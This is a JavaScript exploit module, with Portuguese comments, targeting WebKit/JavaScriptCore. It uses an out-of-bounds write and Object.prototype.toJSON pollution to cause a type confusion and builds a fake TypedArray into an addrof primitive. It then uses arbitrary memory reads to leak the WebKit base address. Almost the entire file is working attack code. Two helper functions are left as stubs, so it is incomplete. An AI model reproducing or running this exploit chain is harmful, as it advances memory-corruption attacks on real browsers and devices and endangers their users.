// js/script3/testArrayBufferVictimCrash.mjs (R44 - FakeTypedArray)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R44_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R44_FakeTypedArray";

const PROBE_CALL_LIMIT_V82 = 10;

// Focar nos parâmetros que sabemos que causam a TC de forma confiável
const OOB_OFFSET_FOR_TC_TRIGGER = 0x7C;
const OOB_VALUE_FOR_TC_TRIGGER = 0xABABABAB;

// Offsets dentro do objeto JS. Estes são os valores do seu config.mjs.
// A hipótese é que as propriedades do nosso objeto M2 se alinharão a estes offsets.
const FAKE_TA_VECTOR_OFFSET = JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x10
const FAKE_TA_LENGTH_OFFSET = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x18
// Isso implica que deve haver 16 bytes (0x10) de dados antes de `corrupted_vector`
// e 8 bytes (0x08) entre `corrupted_vector` e `corrupted_length`.

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let target_function_for_addrof;

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */ }
function safeToHex(value, length = 8) { /* ... (sem alteração) ... */ }

// Nossa nova primitiva de addrof, se o exploit funcionar
let addrof_primitive = null;

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R44() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R44_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Addrof via Falsificação de TypedArray ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init FakeTA...`;

    target_function_for_addrof = function someUniqueLeakFunctionR44_FakeTA() { return `target_R44_FakeTA_${Date.now()}`; };
    
    let FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Init`;

    logS3(`--- Fase 0 (FakeTA): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { return { errorOccurred: "OOB Sanity Check Failed" }; }

    // --- Tentativa de criar a primitiva ADDROF ---
    logS3(`--- Fase 1 (FakeTA): Tentando construir a primitiva ADDROF ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let victim_ta_for_json_trigger = null;
    let m1_ref = null;
    let m2_ref = null; // Nosso Fake TypedArray
    let target_object_for_initial_leak = null; // O objeto que será apontado pelo fake vector
    
    let probe_call_count_iter = 0;
    let tc_detected_this_iter = false;
    let stringify_result_raw = null;

    function fake_ta_probe_toJSON() {
        probe_call_count_iter++;
        if (probe_call_count_iter === 1 && this === victim_ta_for_json_trigger) {
            logS3(`[PROBE_FakeTA] Call #1: 'this' é victim_ta. Criando M1/M2(FakeTA).`, "debug_detail");
            
            target_object_for_initial_leak = new Uint32Array(2);
            target_object_for_initial_leak[0] = 0xCAFEF00D;
            target_object_for_initial_leak[1] = 0xFEEDBEEF;

            // Criar o Fake TypedArray (M2)
            m2_ref = {
                // p0, p1 ocupam 16 bytes (0x10), assumindo que são armazenados como valores de 64 bits.
                // Isso alinhará `corrupted_vector` com o offset 0x10.
                p0: 0x41414141, p1: 0x42424242, 
                
                // Agora em offset 0x10. Será interpretado como m_vector (ponteiro de dados).
                corrupted_vector: target_object_for_initial_leak, 
                
                // Agora em offset 0x18. Será interpretado como m_length (comprimento).
                corrupted_length: 2, 
                
                // Propriedade extra
                id: "M2_FakeTA"
            };
            
            m1_ref = { id: "M1_FakeTA", m2_payload: m2_ref };
            return m1_ref;
        } else if (probe_call_count_iter === 2 && this === m2_ref) {
            logS3(`[PROBE_FakeTA] Call #2: 'this' é M2(FakeTA). TC CONFIRMADA! Deixando stringify vazar o endereço...`, "vuln");
            tc_detected_this_iter = true;
            // Não fazemos nada aqui. A mágica acontece quando o JSON.stringify
            // tenta ler de 'this' (M2) como se fosse um TypedArray.
            return this;
        }
        return {};
    }

    try {
        victim_ta_for_json_trigger = new Uint32Array(8);
        victim_ta_for_json_trigger.fill(0);

        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        oob_write_absolute(OOB_OFFSET_FOR_TC_TRIGGER, OOB_VALUE_FOR_TC_TRIGGER, 4);
        logS3(`   OOB Write (TC Trigger): ${safeToHex(OOB_VALUE_FOR_TC_TRIGGER)} @ ${safeToHex(OOB_OFFSET_FOR_TC_TRIGGER)}`, 'info');

        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: fake_ta_probe_toJSON, writable: true, configurable: true, enumerable: false });
            polluted = true;
            stringify_result_raw = JSON.stringify(victim_ta_for_json_trigger);
        } finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }

        logS3(`   JSON.stringify raw output: ${stringify_result_raw}`, "leak");

        if (tc_detected_this_iter && stringify_result_raw.includes("[")) {
            const parts = stringify_result_raw.match(/\[(\d+),(\d+)\]/);
            if (parts && parts.length === 3) {
                const low = parseInt(parts[1], 10);
                const high = parseInt(parts[2], 10);
                const leaked_addr = new AdvancedInt64(low, high);

                logS3(`   !!! ENDEREÇO VAZADO (JSCell de target_object_for_initial_leak): ${leaked_addr.toString(true)} !!!`, "success_major");
                
                // Se chegamos aqui, temos um addrof! Agora, vamos envolvê-lo em uma função.
                logS3(`--- Construindo a função addrof_primitive(obj) ---`, "info_emphasis");
                addrof_primitive = async (obj_to_leak) => {
                    // Esta função reutiliza a mesma lógica do exploit
                    let local_m2 = {
                        p0: 0, p1: 0,
                        corrupted_vector: obj_to_leak,
                        corrupted_length: 2
                    };
                    let local_m1 = { m2_payload: local_m2 };
                    let local_probe_call_count = 0;
                    
                    const local_probe = function() {
                        local_probe_call_count++;
                        if (local_probe_call_count === 1) return local_m1;
                        if (local_probe_call_count === 2) return local_m2;
                        return {};
                    };

                    let stringify_res = "";
                    const _ppKey = 'toJSON'; let _origDesc = Object.getOwnPropertyDescriptor(Object.prototype, _ppKey); let _polluted = false;
                    try {
                        Object.defineProperty(Object.prototype, _ppKey, { value: local_probe, writable: true, configurable: true, enumerable: false });
                        _polluted = true;
                        stringify_res = JSON.stringify(new Uint32Array(8));
                    } finally { if (_polluted) { if (_origDesc) Object.defineProperty(Object.prototype, _ppKey, _origDesc); else delete Object.prototype[_ppKey]; } }
                    
                    const _parts = stringify_res.match(/\[(\d+),(\d+)\]/);
                    if (_parts && _parts.length === 3) {
                        return new AdvancedInt64(parseInt(_parts[1], 10), parseInt(_parts[2], 10));
                    }
                    return null;
                };
                logS3(`   Função addrof_primitive(obj) criada com sucesso.`, "good");

            } else {
                throw new Error("TC ocorreu, mas a saída de JSON.stringify não continha o endereço vazado esperado.");
            }
        } else {
            throw new Error("Falha ao acionar a Confusão de Tipos ou o exploit FakeTA.");
        }
    } catch(e) {
        logS3(`   ERRO na Fase 1 (construção do addrof): ${e.message}`, "critical");
        return { errorOccurred: e.message };
    }

    if (!addrof_primitive) {
        logS3(`--- FASE FINAL FALHOU: Primitiva de ADDROF não pôde ser construída. ---`, "critical");
        return { errorOccurred: "addrof_primitive_construction_failed" };
    }

    // --- Usando a primitiva ADDROF para vazar o endereço base do WebKit ---
    logS3(`--- Fase 2 (FakeTA): Usando addrof para vazar o endereço base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    try {
        const addr_of_target_func = await addrof_primitive(target_function_for_addrof);
        if (!isValidPointer(addr_of_target_func, "_addrOfTargetFunc")) {
            throw new Error(`addrof(target_function) retornou um ponteiro inválido: ${safeToHex(addr_of_target_func)}`);
        }
        logS3(`   addrof(target_function_for_addrof) = ${addr_of_target_func.toString(true)}`, "leak");

        const ptr_exe = await arb_read(addr_of_target_func.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
        if (!isValidPointer(ptr_exe, "_wkLeakExeFakeTA")) throw new Error("Ponteiro para Executable inválido.");
        logS3(`   Ponteiro para Executable Instance = ${ptr_exe.toString(true)}`, "leak_detail");

        const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
        if (!isValidPointer(ptr_jitvm, "_wkLeakJitVmFakeTA")) throw new Error("Ponteiro para JIT Code/VM inválido.");
        logS3(`   Ponteiro para JIT Code/VM = ${ptr_jitvm.toString(true)}`, "leak_detail");

        const webkit_base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF)); // Alinhar para a página
        logS3(`   !!! ENDEREÇO BASE DO WEBKIT (CANDIDATO): ${webkit_base_candidate.toString(true)} !!!`, "success_major");

        document.title = `${FNAME_CURRENT_TEST_BASE} Final: WEBKIT_LEAK_OK!`;
        return {
            success: true,
            addrof_primitive_created: true,
            webkit_base_leaked: webkit_base_candidate.toString(true)
        };

    } catch(e) {
        logS3(`   ERRO na Fase 2 (vazamento da base): ${e.message}`, "critical");
        document.title = `${FNAME_CURRENT_TEST_BASE} Final: WebKitLeak FAILED`;
        return { errorOccurred: e.message, addrof_primitive_created: true };
    }
}
